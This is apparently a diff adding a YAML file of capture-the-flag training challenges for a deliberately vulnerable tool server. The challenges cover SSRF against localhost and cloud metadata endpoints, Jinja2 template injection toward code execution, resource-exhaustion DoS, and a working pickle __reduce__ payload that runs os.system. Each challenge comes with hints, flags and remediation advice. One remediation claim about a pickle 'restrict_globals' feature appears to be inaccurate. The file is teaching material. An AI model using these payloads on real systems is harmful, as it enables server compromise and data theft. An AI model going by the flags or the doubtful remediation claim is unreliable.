@@ -1,0 +1,152 @@
+challenges:
+  - id: ADVANCED-001
+    title: "Server-Side Request Forgery (SSRF)"
+    category: ssrf
+    difficulty: advanced
+    cwe: CWE-918
+    cvss: 8.6
+    points: 300
+    tools:
+      - fetch_url
+    description: |
+      The fetch_url tool makes HTTP requests to any user-specified URL without
+      filtering. This allows the server to make requests to internal services,
+      cloud metadata endpoints, and localhost resources that should not be
+      externally accessible.
+    objective: |
+      Use fetch_url to access an internal or restricted endpoint.
+    exploitation_steps:
+      - "Try: fetch_url('http://localhost/admin')"
+      - "Try: fetch_url('http://127.0.0.1/admin')"
+      - "Cloud metadata (in AWS): fetch_url('http://169.254.169.254/latest/meta-data/')"
+      - "Simulated versions of all these are pre-loaded for offline demos"
+    hints:
+      - level: 1
+        text: "Can you make the server fetch an internal URL that you couldn't access directly?"
+      - level: 2
+        text: "Try: http://localhost/admin or http://127.0.0.1/admin"
+      - level: 3
+        text: "AWS metadata endpoint: http://169.254.169.254/latest/meta-data/ (simulated offline)"
+    flag: "FLAG{ssrf_1nt3rn4l_n3tw0rk}"
+    remediation: |
+      - Implement URL allowlist: only permit specific domains/IPs
+      - Block requests to private IP ranges: 127.x, 10.x, 172.16-31.x, 192.168.x, 169.254.x
+      - Use a dedicated outbound HTTP proxy with egress filtering
+      - Validate that resolved IPs are not in blocked ranges (after DNS resolution)
+
+  - id: ADVANCED-002
+    title: "Server-Side Template Injection (SSTI)"
+    category: injection
+    difficulty: advanced
+    cwe: CWE-94
+    cvss: 9.0
+    points: 300
+    tools:
+      - render_template
+    description: |
+      The render_template tool uses jinja2.Environment (non-sandboxed) to render
+      user-supplied templates. Jinja2 templates have access to Python internals
+      via __class__ and __mro__, allowing an attacker to traverse the class
+      hierarchy and reach dangerous built-ins like subprocess.Popen.
+    objective: |
+      Use template injection to enumerate Python subclasses and demonstrate
+      the path to arbitrary code execution.
+    exploitation_steps:
+      - "Start simple: render_template('{{ 7 * 7 }}') → should return 49"
+      - "Access class hierarchy: render_template('{{ \"\".__class__.__mro__ }}')"
+      - "List subclasses: render_template('{{ \"\".__class__.__mro__[1].__subclasses__() }}')"
+      - "The flag triggers when subclass enumeration is detected"
+      - "Full RCE payload (advanced): find subprocess.Popen in subclasses and call it"
+    hints:
+      - level: 1
+        text: "Jinja2 templates can access Python objects via __class__ and __mro__."
+      - level: 2
+        text: "Try: {{ ''.__class__.__mro__ }}"
+      - level: 3
+        text: "Try: {{ ''.__class__.__mro__[1].__subclasses__() }}"
+    flag: "FLAG{t3mpl4t3_1nj3ct10n_3v4l}"
+    remediation: |
+      - Use jinja2.sandbox.SandboxedEnvironment instead of jinja2.Environment
+      - Never render user-controlled templates
+      - If templates are needed, use a whitelist of allowed template expressions
+      - Consider using a logic-less template engine (Mustache) instead
+
+  - id: ADVANCED-003
+    title: "Denial of Service via Resource Exhaustion"
+    category: dos
+    difficulty: advanced
+    cwe: CWE-400
+    cvss: 7.5
+    points: 250
+    tools:
+      - fibonacci
+      - generate_permutations
+      - flood_requests
+    description: |
+      Multiple tools have no input bounds, allowing computationally expensive
+      operations that exhaust server resources. fibonacci() uses exponential-time
+      recursion; generate_permutations() has factorial complexity; flood_requests()
+      has no request count limit.
+    objective: |
+      Demonstrate resource exhaustion using at least two of the three vulnerable tools.
+    exploitation_steps:
+      - "Call fibonacci(40) — observe how long exponential recursion takes"
+      - "Call fibonacci(50) — in sandbox mode shows what would happen"
+      - "Call generate_permutations('abcdefghij') — 10! = 3.6M permutations"
+      - "Call generate_permutations('abcdefghijklmn') — 14! = 87B (sandbox blocks this)"
+      - "The flag appears when large inputs are attempted"
+    hints:
+      - level: 1
+        text: "What happens with very large inputs to fibonacci() or generate_permutations()?"
+      - level: 2
+        text: "fibonacci(n) has O(2^n) time complexity. n=50 takes ~10^10 operations."
+      - level: 3
+        text: "Try fibonacci(45) or generate_permutations with a 12+ character string."
+    flag: "FLAG{d0s_r3s0urc3_3xh4ust10n}"
+    remediation: |
+      - Enforce strict input bounds: n < 40 for fibonacci, len < 8 for permutations
+      - Use memoization (@functools.lru_cache) or iterative algorithms
+      - Implement per-request CPU time limits and memory quotas
+      - Set timeouts on all tool executions
+      - Rate-limit tool calls per session
+
+  - id: ADVANCED-004
+    title: "Insecure Deserialization (Pickle RCE)"
+    category: injection
+    difficulty: advanced
+    cwe: CWE-502
+    cvss: 9.8
+    points: 400
+    tools:
+      - create_report
+    description: |
+      The create_report tool deserializes base64-encoded Python pickle data from
+      user input. Python pickle allows arbitrary code execution via the __reduce__
+      method, enabling complete server compromise from a single tool call.
+    objective: |
+      Create a malicious pickle payload that executes a command on the server.
+    exploitation_steps:
+      - "Create a malicious pickle object in Python:"
+      - |
+        import pickle, base64, os
+        class Exploit:
+            def __reduce__(self):
+                return (os.system, ('whoami',))
+        payload = base64.b64encode(pickle.dumps(Exploit())).decode()
+      - "Call: create_report(payload)"
+      - "In sandbox mode, the flag is returned without actual execution"
+      - "Set MCP_SANDBOX=false (Docker only) for real execution"
+    hints:
+      - level: 1
+        text: "Python pickle allows arbitrary code execution via __reduce__."
+      - level: 2
+        text: "Create a class with __reduce__ returning (os.system, ('id',))."
+      - level: 3
+        text: "Use: import pickle,base64,os; class E: __reduce__=lambda self: (os.system,('id',)); base64.b64encode(pickle.dumps(E())).decode()"
+    flag: "FLAG{p1ckl3_d3s3r14l1z4t10n_rce}"
+    remediation: |
+      - Never deserialize untrusted pickle data
+      - Use JSON, MessagePack, or other safe serialization formats for user input
+      - If pickle is required, verify integrity with HMAC before deserializing
+      - Use Python's pickle restrict_globals (Python 3.12+) to limit dangerous classes
+      - Run deserialization in an isolated subprocess with minimal permissions
